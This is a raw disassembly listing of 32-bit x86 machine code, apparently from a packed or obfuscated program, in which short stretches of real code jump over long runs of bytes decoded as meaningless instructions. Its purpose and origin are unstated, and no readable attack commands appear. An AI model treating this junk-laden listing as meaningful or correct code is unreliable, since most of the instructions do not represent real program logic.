  40f0d0:	loope  0x40f07c
  40f0d2:	inc    esp
  40f0d3:	imul   ebx,DWORD PTR [edx+0x20e6d8ce],0xb
  40f0da:	mov    cl,BYTE PTR [esi+0x29d456ba]
  40f0e0:	lods   eax,DWORD PTR ds:[esi]
  40f0e1:	mov    bh,0x1b
  40f0e3:	push   edi
  40f0e4:	jne    0x40f162
  40f0e6:	cmp    DWORD PTR [esi-0x1c1d2bdc],edi
  40f0ec:	sbb    edi,DWORD PTR [edx-0x5f]
  40f0ef:	jl     0x40f13a
  40f0f1:	dec    esp
  40f0f2:	sbb    ch,BYTE PTR [edx+0x62ffacd8]
  40f0f8:	test   BYTE PTR [edi+0x58088bb7],ah
  40f0fe:	lahf   
  40f0ff:	cmp    eax,0xc2eace61
  40f104:	jle    0x40f15c
  40f106:	mov    al,0x44
  40f108:	cmc    
  40f109:	stc    
  40f10a:	std    
  40f10b:	mov    dl,BYTE PTR [esi+0x10]
  40f10e:	nop
  40f10f:	sub    BYTE PTR [eax],0x20
  40f112:	loopne 0x40f0e9
  40f114:	or     eax,0x33a612f7
  40f119:	fdivr  st(4),st
  40f11b:	repz and al,0x32
  40f11e:	bound  esi,QWORD PTR [ebp-0x5c4608cc]
  40f124:	or     ebp,0xfc0e97bf
  40f12a:	in     al,0x5a
  40f12c:	jecxz  0x40f0d5
  40f12e:	push   edi
  40f12f:	stos   BYTE PTR es:[edi],al
  40f130:	mov    dl,0x6c
  40f132:	fwait
  40f133:	je     0x40f12b
  40f135:	xor    ecx,0xffffff88
  40f138:	xor    bh,dl
  40f13a:	mov    ebp,0x46eb52ed
  40f13f:	sub    DWORD PTR [edi],ebx
  40f141:	iret   
  40f142:	push   ebx
  40f143:	int3   
  40f144:	mov    al,0xe8
  40f146:	jns    0x40f10d
  40f148:	outs   dx,DWORD PTR ds:[esi]
  40f149:	push   esp
  40f14a:	hlt    
  40f14b:	mov    al,0x54
  40f14d:	mov    bh,0x4
  40f14f:	add    eax,0xff7f317
  40f154:	test   BYTE PTR [eax+0x1],bh
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR ds:0xa3b59580,ebp
  40f172:	stos   BYTE PTR es:[edi],al
  40f173:	jo     0x40f1e5
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f148
  40f17a:	pop    ebx
  40f17b:	nop
  40f17c:	shl    BYTE PTR [eax+0x3302390],0xcf
  40f183:	jnp    0x40f178
  40f185:	mov    ?,WORD PTR [edi]
  40f187:	xchg   ecx,eax
  40f188:	stos   BYTE PTR es:[edi],al
  40f189:	jnp    0x40f19e
  40f18b:	lods   al,BYTE PTR ds:[esi]
  40f18c:	outs   dx,BYTE PTR ds:[esi]
  40f18d:	dec    esp
  40f18e:	inc    ebp
  40f18f:	and    ah,ch
  40f191:	popf   
  40f192:	mov    bl,0x51
  40f194:	rcr    BYTE PTR [ebp-0x5b13b846],0x29
  40f19b:	rcr    BYTE PTR [esi-0x76],1
  40f19e:	mov    DWORD PTR [edx],ecx
  40f1a0:	imul   eax,eax,0x243708b3
  40f1a6:	ja     0x40f224
  40f1a8:	pop    es
  40f1a9:	(bad)  
  40f1aa:	hlt    
  40f1ab:	jmp    0x40f20c
  40f1ad:	xor    dh,BYTE PTR [esp+edx*8]
  40f1b0:	sbb    BYTE PTR [ebx+0xdda24f0],bl
  40f1b6:	mov    ds:0xe894dd4d,al
  40f1bb:	pop    esp
  40f1bc:	out    0x2b,al
  40f1be:	mov    ecx,0x67c936bf
  40f1c3:	js     0x40f1ed
  40f1c5:	adc    bl,dh
  40f1c7:	sbb    BYTE PTR [eax+0x4ec1b2f],ah
  40f1cd:	ins    DWORD PTR es:[edi],dx
  40f1ce:	mov    edx,0xe47e549
  40f1d3:	loopne 0x40f175
  40f1d5:	lock dec ebp
  40f1d7:	popf   
  40f1d8:	push   esp
  40f1d9:	pop    esi
  40f1da:	stc    
  40f1db:	sbb    esp,DWORD PTR [edi]
  40f1dd:	add    cl,BYTE PTR [edx]
  40f1df:	xor    eax,0x7ac780fe
  40f1e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1e5:	nop
  40f1e6:	cmp    BYTE PTR [eax-0x31],ch
  40f1e9:	sub    eax,esp
  40f1eb:	rcl    BYTE PTR [ebp-0x1e],cl
  40f1ee:	lds    ecx,FWORD PTR [ebx]
  40f1f0:	sub    esp,ecx
  40f1f2:	neg    BYTE PTR [edi-0x2e]
  40f1f5:	xor    edx,DWORD PTR [ebp+ecx*8+0x3e25e961]
  40f1fc:	mov    edx,0x9bd7984
  40f201:	push   eax
  40f202:	inc    eax
  40f203:	(bad)  
  40f204:	mov    ds:0x30f602ac,eax
  40f209:	jge    0x40f26d
  40f20b:	mov    cl,0x5f
  40f20d:	jbe    0x40f21b
  40f20f:	(bad)  
  40f210:	sti    
  40f211:	and    ecx,DWORD PTR [ebp-0x4e84d28b]
  40f217:	push   edx
  40f218:	scas   eax,DWORD PTR es:[edi]
  40f219:	inc    DWORD PTR [ebx-0x757d41b8]
  40f21f:	xor    edi,DWORD PTR ss:[esi+0x27acde4b]
  40f226:	je     0x40f1ce
  40f228:	xor    BYTE PTR [edx+0x1b],bh
  40f22b:	jecxz  0x40f2aa
  40f22d:	outs   dx,DWORD PTR ds:[esi]
  40f22e:	rcl    bh,cl
  40f230:	adc    eax,0xc56f9076
  40f235:	xchg   ebp,eax
  40f236:	push   ds
  40f237:	mov    esi,0x8b4d626c
  40f23c:	cdq    
  40f23d:	xor    al,0x62
  40f23f:	add    BYTE PTR [eax-0x26b3079b],0xdf
  40f246:	xchg   edx,eax
  40f247:	or     DWORD PTR [ebp+0x18c46e5a],edi
  40f24d:	adc    ebx,esp
  40f24f:	mov    ecx,0xd30aaa5b
  40f254:	stc    
  40f255:	push   esp
  40f256:	fdivr  st,st(3)
  40f258:	jns    0x40f284
  40f25a:	push   esp
  40f25b:	add    al,al
  40f25d:	add    al,BYTE PTR [ebx]
  40f25f:	lahf   
  40f260:	mov    edi,0xb082d2
  40f265:	je     0x40f268
  40f267:	outs   dx,BYTE PTR ds:[esi]
  40f268:	add    BYTE PTR [ecx-0x1f38cb4c],dh
  40f26e:	adc    al,BYTE PTR [ecx-0xd993d7a]
  40f274:	aam    0xb1
  40f276:	sub    DWORD PTR [edi-0x8a39e5],0x50
  40f27d:	(bad)  
  40f27e:	push   ebx
  40f27f:	mov    edx,0x9bf63f93
  40f284:	or     eax,0xd91de85b
  40f289:	add    eax,0xb42872bd
  40f28e:	add    DWORD PTR [ecx-0x4a4f903c],edx
  40f294:	pop    ss
  40f295:	ds inc eax
  40f297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f298:	xchg   BYTE PTR [edi-0x1d],bl
  40f29b:	xchg   edi,eax
  40f29c:	xor    edx,DWORD PTR [ebp-0x55]
  40f29f:	mov    bh,0xa1
  40f2a1:	adc    BYTE PTR [esi],bl
  40f2a3:	sub    ebp,ebp
  40f2a5:	imul   esi,DWORD PTR [eax-0x23ba42b8],0xffffff85
  40f2ac:	push   esp
  40f2ad:	cmp    DWORD PTR es:[edx+0x28],0x21
  40f2b2:	lahf   
  40f2b3:	xchg   esi,eax
  40f2b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b5:	(bad)  
  40f2b6:	(bad)  
  40f2b7:	loop   0x40f31d
  40f2b9:	add    bh,cl
  40f2bb:	sub    edi,DWORD PTR ds:0xa4d91c84
  40f2c1:	mov    dl,0x4
  40f2c3:	ins    DWORD PTR es:[edi],dx
  40f2c4:	imul   ecx,ebx,0xffffffc7
  40f2c7:	add    BYTE PTR [ecx-0x169fcbe2],cl
  40f2cd:	in     eax,0x4
  40f2cf:	add    BYTE PTR [eax],al
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rcl    BYTE PTR [ecx],1
  40f2f8:	iret   
  40f2f9:	add    DWORD PTR [ebp+0x76],esi
  40f2fc:	test   eax,0x7fc37070
  40f301:	jo     0x40f373
  40f303:	jb     0x40f355
  40f305:	mov    ds:0x6bb806f0,eax
  40f30a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f30b:	(bad)  
  40f30c:	mov    esp,0x2551286f
  40f311:	pop    ecx
  40f312:	cli    
  40f313:	add    bl,BYTE PTR [ebp-0x2d7c00f3]
  40f319:	push   edi
  40f31a:	cmp    al,bh
  40f31c:	loop   0x40f2c5
  40f31e:	inc    esi
  40f31f:	mov    bh,0x4c
  40f321:	jl     0x40f355
  40f323:	dec    esi
  40f324:	push   cs
  40f325:	loop   0x40f34e
  40f327:	loope  0x40f2db
  40f329:	jge    0x40f341
  40f32b:	scas   eax,DWORD PTR es:[edi]
  40f32c:	call   0x17b9:0xcffbd9da
  40f333:	jg     0x40f33c
  40f335:	outs   dx,BYTE PTR ds:[esi]
  40f336:	ficomp DWORD PTR [ebp-0x4d]
  40f339:	jl     0x40f2d5
  40f33b:	mov    dh,0xbd
  40f33d:	pop    edi
  40f33e:	push   esi
  40f33f:	ds cli 
  40f341:	cmp    al,0xc4
  40f343:	xor    BYTE PTR [edx],dh
  40f345:	adc    al,BYTE PTR [eax+ecx*1]
  40f348:	(bad)  
  40f349:	sbb    DWORD PTR [eax+0x12],ebp
  40f34c:	aaa    
  40f34d:	stc    
  40f34e:	adc    al,0x7c
  40f350:	mov    eax,0xf989e92e
  40f355:	mov    dl,0x6f
  40f357:	jge    0x40f318
  40f359:	sub    al,0x75
  40f35b:	fldenv [edi-0xb8276bb]
  40f361:	mov    esi,0x2fdcf51e
  40f366:	push   ds
  40f367:	cmp    DWORD PTR [ebx+ecx*4+0x7a],ecx
  40f36b:	retf   0x22d6
  40f36e:	mov    ds:0x49319164,al
  40f373:	out    0xd8,al
  40f375:	mov    cl,0xa8
  40f377:	rcl    esi,cl
  40f379:	inc    eax
  40f37a:	mov    ah,0x59
  40f37c:	mov    ebp,0x8dfd0bff
  40f381:	jmp    0xa8b04fd1
  40f386:	sbb    bl,BYTE PTR [eax]
  40f388:	aaa    
  40f389:	push   esi
  40f38a:	push   esi
  40f38b:	out    0xa5,al
  40f38d:	retf   0xe52a
  40f390:	push   0x7b
  40f392:	pusha  
  40f393:	jb     0x40f330
  40f395:	cmp    cl,cl
  40f397:	fsubr  QWORD PTR [esp+ecx*2+0x34142538]
  40f39e:	mov    al,0x64
  40f3a0:	push   0x2a
  40f3a2:	cmp    dh,ah
  40f3a4:	xlat   BYTE PTR ds:[ebx]
  40f3a5:	jb     0x40f342
  40f3a7:	sahf   
  40f3a8:	loop   0x40f348
  40f3aa:	out    0x29,eax
  40f3ac:	and    BYTE PTR [edi-0x4ff7de46],al
  40f3b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3b3:	mov    al,ds:0xe55002d9
  40f3b8:	ror    BYTE PTR [ebp+0x7ae145dc],cl
  40f3be:	or     al,0xb7
  40f3c0:	sbb    dl,ch
  40f3c2:	pop    ss
  40f3c3:	into   
  40f3c4:	jns    0x40f40b
  40f3c6:	push   eax
  40f3c7:	jmp    0x1ebe:0x1191bcd1
  40f3ce:	in     eax,0x6b
  40f3d0:	mov    edx,0x8b315733
  40f3d5:	outs   dx,BYTE PTR ds:[esi]
  40f3d6:	mov    al,ds:0x3eed158b
  40f3db:	push   es
  40f3dc:	loope  0x40f385
  40f3de:	fisttp DWORD PTR [esi]
  40f3e0:	stc    
  40f3e1:	lds    eax,FWORD PTR [ebp+0x55c63e94]
  40f3e7:	xor    al,0x1a
  40f3e9:	add    al,0x9f
  40f3eb:	jno    0x40f3b7
  40f3ed:	dec    ebx
  40f3ee:	ds mov ecx,0x78d599f3
  40f3f4:	call   0x89cd:0x54adfa25
  40f3fb:	mov    WORD PTR [ebp+edx*8-0x55],ds
  40f3ff:	jp     0x40f39c
  40f401:	shl    edx,0x1c
  40f404:	shl    BYTE PTR [ecx-0x71],cl
  40f407:	add    ebp,DWORD PTR [ecx-0x7e]
  40f40a:	push   ds
  40f40b:	dec    eax
  40f40c:	mov    ah,0xa3
  40f40e:	inc    ecx
  40f40f:	xor    ebx,0x5e
  40f412:	xchg   ebp,eax
  40f413:	xchg   ebp,eax
  40f414:	and    esi,DWORD PTR [edx]
  40f416:	pop    ecx
  40f417:	call   0xec51:0xcce5d903
  40f41e:	imul   edi,DWORD PTR [ebp-0x7e],0x5d
  40f422:	push   ecx
  40f423:	inc    ecx
  40f424:	mov    cl,0x70
  40f426:	pop    esp
  40f427:	or     edi,0x3b
  40f42a:	xor    eax,0x6a18a6a5
  40f42f:	imul   BYTE PTR [ebp-0x4f]
  40f432:	(bad)  
  40f433:	jl     0x40f423
  40f435:	sahf   
  40f436:	shl    BYTE PTR [ecx-0x15],cl
  40f439:	jnp    0x40f3f7
  40f43b:	pop    esp
  40f43c:	es repz mov ch,0x97
  40f440:	das    
  40f441:	call   0x8bde02e0
  40f446:	mov    ds:0x7573c4e2,eax
  40f44b:	mov    bl,0x1e
  40f44d:	loopne 0x40f3f8
  40f44f:	mov    WORD PTR [ebx+0x65e9f845],cs
  40f455:	add    DWORD PTR [eax],eax
  40f457:	add    BYTE PTR [eax+0x65],al
  40f45a:	ror    ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	xor    al,0xa7
  40f466:	add    cl,BYTE PTR [edi]
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	shl    esi,0xcd
  40f473:	repz cmp eax,0xf0de7ea5
  40f479:	sahf   
  40f47a:	test   DWORD PTR [eax-0x601c3d28],edi
  40f480:	sbb    al,0x72
  40f482:	aam    0x4d
  40f484:	and    BYTE PTR [ecx],ah
  40f486:	repnz mov ds:0x61984f8d,al
  40f48c:	outs   dx,BYTE PTR ds:[esi]
  40f48d:	inc    ebp
  40f48e:	aaa    
  40f48f:	mov    ds:0xd1347b9f,eax
  40f494:	add    esp,DWORD PTR [eax+0xbead607]
  40f49a:	xchg   edx,eax
  40f49b:	sbb    al,0x0
  40f49d:	inc    edi
  40f49e:	rcr    bh,0x8b
  40f4a1:	es mov edi,0xb5c9eb02
  40f4a7:	mov    ebp,0x52a5dff8
  40f4ac:	sbb    bl,BYTE PTR fs:[ecx]
  40f4af:	mov    cs,WORD PTR [ebp+eax*2+0x62]
  40f4b3:	pop    ds
  40f4b4:	pusha  
  40f4b5:	into   
  40f4b6:	pop    es
  40f4b7:	(bad)  [esi+0x7c05977d]
  40f4bd:	sbb    BYTE PTR [ebp-0x4f9aa16f],dl
  40f4c3:	pop    edi
  40f4c4:	idiv   cl
  40f4c6:	(bad)  
  40f4c7:	xor    BYTE PTR [esi],bh
  40f4c9:	mov    bl,0x45
  40f4cb:	push   edx
  40f4cc:	add    DWORD PTR [edi-0x4a],edx
  40f4cf:	mov    dh,0x63
  40f4d1:	lods   eax,DWORD PTR ds:[esi]
  40f4d2:	rcl    DWORD PTR [ecx-0x3d9f90f1],1
  40f4d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4d9:	jnp    0x40f4f8
  40f4db:	cwde   
  40f4dc:	adc    ecx,DWORD PTR [esi-0x52]
  40f4df:	bnd jb 0x40f51e
  40f4e2:	inc    eax
  40f4e3:	mov    al,0x61
  40f4e5:	mov    DWORD PTR [ebx-0x17],ecx
  40f4e8:	push   eax
  40f4e9:	pop    ecx
  40f4ea:	and    ah,dh
  40f4ec:	mov    DWORD PTR [edi+eiz*4+0x5deff862],eax
  40f4f3:	jecxz  0x40f54f
  40f4f5:	int    0x47
  40f4f7:	inc    edx
  40f4f8:	adc    eax,0x5d7f29bb
  40f4fd:	cs mov ah,0x30
  40f500:	inc    eax
  40f501:	dec    ebx
  40f502:	mov    BYTE PTR [edi+0x15],al
  40f505:	repz or bl,ah
  40f508:	cwde   
  40f509:	in     eax,0x87
  40f50b:	adc    eax,0xb93e1081
  40f510:	inc    edi
  40f511:	stc    
  40f512:	push   ebp
  40f513:	adc    dh,BYTE PTR [edx]
  40f515:	sti    
  40f516:	jne    0x40f4eb
  40f518:	lds    edi,FWORD PTR [eax]
  40f51a:	mov    bh,0x16
  40f51c:	mov    edi,0xfbbd5d11
  40f521:	es scas eax,DWORD PTR es:[edi]
  40f523:	and    BYTE PTR [edx+0x4635381f],ah
  40f529:	xor    eax,0x7b39c64e
  40f52e:	xchg   ebp,eax
  40f52f:	aas    
  40f530:	outs   dx,BYTE PTR ds:[esi]
  40f531:	mov    ds:0x5cbb0398,al
  40f536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f537:	xor    al,BYTE PTR [esi+esi*8+0x65]
  40f53b:	ins    BYTE PTR es:[edi],dx
  40f53c:	mov    bh,0xce
  40f53e:	xchg   edx,eax
  40f53f:	xor    dl,BYTE PTR [edi]
  40f541:	push   ecx
  40f542:	adc    al,0x2a
  40f544:	cld    
  40f545:	(bad)
  40f548:	cs addr16 js 0x40f54a
  40f54c:	(bad)  
  40f54e:	push   esi
  40f54f:	or     DWORD PTR [eax],esi
  40f551:	fild   WORD PTR [edi-0x10]
  40f554:	inc    ebx
  40f555:	rcr    DWORD PTR [ebp+0x6a],1
  40f558:	gs adc eax,0x6ddff0f
  40f55e:	jmp    0x61c0:0x82671b18
  40f565:	pop    esp
  40f566:	lea    ebx,[ebx+0x7c]
  40f569:	test   eax,0xac660005
  40f56e:	fdivr  QWORD PTR [esi-0x199ab918]
  40f574:	call   0x6f68c2b9
  40f579:	inc    esp
  40f57a:	mov    ch,0x4e
  40f57c:	out    dx,eax
  40f57d:	sti    
  40f57e:	scas   eax,DWORD PTR es:[edi]
  40f57f:	cs adc esi,edx
  40f582:	lods   eax,DWORD PTR ds:[esi]
  40f583:	and    ah,BYTE PTR [ebx]
  40f585:	inc    esi
  40f586:	xor    al,0x42
  40f588:	jb     0x40f593
  40f58a:	adc    ah,BYTE PTR [edi-0xd]
  40f58d:	retf   0x8194
  40f590:	jge    0x40f577
  40f592:	mov    BYTE PTR ds:0x10664f34,dl
  40f598:	lock lea edi,[eax-0x44be8893]
  40f59f:	push   0x324c1a1a
  40f5a4:	or     al,0x3
  40f5a6:	in     al,0xd2
  40f5a8:	mov    edx,0x668811d3
  40f5ad:	pop    ds
  40f5ae:	sub    BYTE PTR [ecx-0x4f],ah
  40f5b1:	pop    eax
  40f5b2:	es call 0xffda648b
  40f5b8:	(bad)  
  40f5b9:	out    dx,eax
  40f5ba:	jb     0x40f63a
  40f5bc:	jle    0x40f549
  40f5be:	add    BYTE PTR [ebx+0xc8d3c40],cl
  40f5c4:	int    0x78
  40f5c6:	add    BYTE PTR [eax],al
  40f5c8:	add    BYTE PTR [ebx],al
  40f5ca:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40f5d1:	add    al,0x8
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	cmp    eax,0x8ce1a4a3
  40f608:	mov    dh,0x70
  40f60a:	jo     0x40f5cf
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f5c9
  40f610:	imul   eax,DWORD PTR [ebp+0x49001959],0x8644bbd7
  40f61a:	aam    0xc8
  40f61c:	push   cs
  40f61d:	and    esi,DWORD PTR [edx+0x5be96183]
  40f623:	and    edx,DWORD PTR ds:0x19bd4b47
  40f629:	into   
  40f62a:	cmp    eax,DWORD PTR [esi]
  40f62c:	mov    ds:0x8215bcd4,eax
  40f631:	sub    eax,0x4adbd7cb
  40f636:	and    ah,BYTE PTR [ebp-0x7e]
  40f639:	sub    eax,0xd7a28aa0
  40f63e:	jl     0x40f5cd
  40f640:	and    eax,DWORD PTR [esi+0x22bcb575]
  40f646:	xor    DWORD PTR [ecx+ebp*8],edx
  40f649:	jecxz  0x40f646
  40f64b:	ret    0x9b73
  40f64e:	add    al,0x16
  40f650:	test   esi,ebx
  40f652:	push   edi
  40f653:	and    BYTE PTR [ebp-0x3fad5f94],ch
  40f659:	icebp  
  40f65a:	in     al,dx
  40f65b:	cmp    dl,BYTE PTR [eax]
  40f65d:	jnp    0x40f668
  40f65f:	cmp    ebp,0xffffff91
  40f662:	mov    bl,0xe7
  40f664:	dec    esp
  40f665:	sub    BYTE PTR [edi],ah
  40f667:	rol    DWORD PTR ds:0x8c034fac,0xf1
  40f66e:	add    DWORD PTR [edi],esi
  40f670:	aaa    
  40f671:	and    al,0x1d
  40f673:	xor    eax,0x56798da6
  40f678:	into   
  40f679:	sbb    eax,DWORD PTR [eax+0x61651f02]
  40f67f:	repz jo 0x40f67e
  40f682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f683:	adc    eax,0x71d827c8
  40f688:	mov    bh,0xba
  40f68a:	test   BYTE PTR [edi],dh
  40f68c:	cmp    eax,0xaabaaa15
  40f691:	and    dl,BYTE PTR [ebx]
  40f693:	push   eax
  40f694:	adc    dl,BYTE PTR [eax+0x68fa7783]
  40f69a:	jns    0x40f64f
  40f69c:	xchg   DWORD PTR [edi],edx
  40f69e:	cmp    cl,BYTE PTR [ebp-0x25]
  40f6a1:	add    al,0xa5
  40f6a3:	cwde   
  40f6a4:	cmp    eax,0x9a28702d
  40f6a9:	xor    ch,bl
  40f6ab:	mov    al,ds:0x676d0daf
  40f6b0:	imul   ebx,ebx,0xffffffe0
  40f6b3:	jecxz  0x40f705
  40f6b5:	cwde   
  40f6b6:	add    eax,0xacd8446a
  40f6bb:	jns    0x40f6da
  40f6bd:	push   ebp
  40f6be:	xor    edx,DWORD PTR [esi-0x691a1e13]
  40f6c4:	sbb    al,0xb1
  40f6c6:	inc    edi
  40f6c7:	pop    eax
  40f6c8:	adc    DWORD PTR [edi],esp
  40f6ca:	int3   
  40f6cb:	in     eax,0xa
  40f6cd:	mov    ecx,edi
  40f6cf:	dec    ebp
  40f6d0:	push   esp
  40f6d1:	icebp  
  40f6d2:	ret    0xc877
  40f6d5:	push   edx
  40f6d6:	jge    0x40f738
  40f6d8:	dec    edi
  40f6d9:	and    al,0x7a
  40f6db:	push   ebp
  40f6dc:	mov    edi,0x730d4b66
  40f6e1:	sbb    DWORD PTR [edi+0x77db67ef],0xffffff80
  40f6e8:	fidiv  WORD PTR [edx+0x58]
  40f6eb:	and    BYTE PTR [esi],0x32
  40f6ee:	mov    ecx,0x12600c72
  40f6f3:	adc    DWORD PTR [edx+0x77],ebp
  40f6f6:	sub    BYTE PTR [esi-0x1eb75c75],ch
  40f6fc:	add    dh,0x68
  40f6ff:	retf   
  40f700:	leave  
  40f701:	lahf   
  40f702:	or     al,BYTE PTR [ebx-0x66]
  40f705:	xor    edi,DWORD PTR [esp+ebx*8-0x62]
  40f709:	mov    esp,0x5c0385e3
  40f70e:	sub    bh,BYTE PTR [eax+eax*2-0x42]
  40f712:	retf   0x6afb
  40f715:	and    eax,0xd223872c
  40f71a:	dec    ecx
  40f71b:	mov    DWORD PTR [ebp+0x60307fef],esp
  40f721:	mov    dl,0xc
  40f723:	mov    ds:0xb89ccea8,eax
  40f728:	inc    ecx
  40f729:	pusha  
  40f72a:	retf   
  40f72b:	jbe    0x40f781
  40f72d:	(bad)  
  40f72e:	sar    DWORD PTR [bp-0x392f],cl
  40f733:	ins    DWORD PTR es:[edi],dx
  40f734:	(bad)  
  40f735:	and    ebx,edi
  40f737:	inc    esp
  40f738:	fisttp QWORD PTR [edi-0x309ed195]
  40f73e:	pop    edi
  40f73f:	xchg   BYTE PTR [ebx+0x3c],bh
  40f742:	data16 jb 0x40f717
  40f745:	dec    ebx
  40f746:	inc    ebp
  40f747:	aad    0x7b
  40f749:	(bad)  
  40f74b:	in     eax,0xbd
  40f74d:	ficom  DWORD PTR [ebx]
  40f74f:	out    dx,eax
  40f750:	scas   eax,DWORD PTR es:[edi]
  40f751:	rcr    BYTE PTR [edx],1
  40f753:	call   0x5cf63bfd
  40f758:	pop    eax
  40f759:	ret    0xea83
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x51e346f3
  40f7e3:	cdq    
  40f7e4:	test   al,0x5f
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f864
  40f7ee:	dec    esi
  40f7ef:	cmp    eax,DWORD PTR [ebx]
  40f7f1:	div    DWORD PTR ds:[edi-0x49]
  40f7f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7f6:	inc    ebp
  40f7f7:	mov    ebx,0x66d1adfb
  40f7fc:	pop    esp
  40f7fd:	je     0x40f7ff
  40f7ff:	es mov ebp,0x515ed429
  40f805:	xor    al,0x18
  40f807:	dec    ebp
  40f808:	leave  
  40f809:	sub    bh,BYTE PTR [edi+0x61]
  40f80c:	out    dx,eax
  40f80d:	add    dh,BYTE PTR [eax-0x7a00842b]
  40f813:	shr    bh,1
  40f815:	pop    edx
  40f816:	jbe    0x40f799
  40f818:	pop    ds
  40f819:	xor    eax,0x1c2cf9de
  40f81e:	mov    edi,DWORD PTR [ecx+0x4b46bcbb]
  40f824:	push   ss
  40f825:	(bad)  
  40f826:	cmp    dh,bh
  40f828:	je     0x40f8a8
  40f82a:	nop
  40f82b:	mov    DWORD PTR [eax+eiz*8-0x102cf135],esp
  40f832:	ret    
  40f833:	loop   0x40f7c7
  40f835:	in     al,dx
  40f836:	mov    ebx,0x6398a747
  40f83b:	popa   
  40f83c:	xchg   edi,eax
  40f83d:	jecxz  0x40f8be
  40f83f:	inc    edx
  40f840:	(bad)  
  40f841:	xchg   ebx,eax
  40f842:	sbb    DWORD PTR [edi-0x45b515ff],ecx
  40f848:	sub    BYTE PTR [ebp-0x1bff0ada],0x65
  40f84f:	repz mov al,ds:0xf34cd9e3
  40f855:	sbb    eax,0xec246af1
  40f85a:	stc    
  40f85b:	push   0xffffff8d
  40f85d:	xlat   BYTE PTR ds:[ebx]
  40f85e:	cmp    esp,esp
  40f860:	mov    esi,0x97910027
  40f865:	ror    BYTE PTR [edi],0x1e
  40f868:	lods   eax,DWORD PTR ds:[esi]
  40f869:	cmp    cl,BYTE PTR [eax]
